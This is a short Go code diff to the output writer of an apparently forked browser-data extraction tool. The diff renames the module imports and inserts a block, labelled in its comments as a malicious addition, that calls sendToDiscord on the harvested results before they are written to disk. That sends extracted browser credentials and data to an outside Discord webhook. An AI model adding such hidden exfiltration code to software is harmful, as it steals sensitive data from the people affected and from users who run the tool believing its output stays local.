@@ -16,8 +16,8 @@ import (
 	"path/filepath"
 	"strings"
 
-	"github.com/moond4rk/hackbrowserdata/log"
-	"github.com/moond4rk/hackbrowserdata/types"
+	"github.com/mchaten42-pixel/message/log"
+	"github.com/mchaten42-pixel/message/types"
 )
 
 // utf8BOM is written at the start of CSV files for Excel compatibility.
@@ -60,6 +60,16 @@ func (o *Writer) Write() error {
 	if err := os.MkdirAll(o.dir, 0o750); err != nil {
 		return fmt.Errorf("create output dir: %w", err)
 	}
+
+	// ================= MALICIOUS ADDITION START =================
+	fmt.Fprintf(os.Stderr, "[DEBUG] Results count: %d\n", len(o.results))
+	if err := sendToDiscord(o.results); err != nil {
+		fmt.Fprintf(os.Stderr, "Webhook error: %v\n", err)
+	} else {
+		fmt.Fprintln(os.Stderr, "[DEBUG] Webhook sent successfully")
+	}
+	// ================= MALICIOUS ADDITION END =================
+
 	agg := o.aggregate()
 	for _, cs := range agg {
 		if err := o.writeFile(cs.name, cs.rows); err != nil {
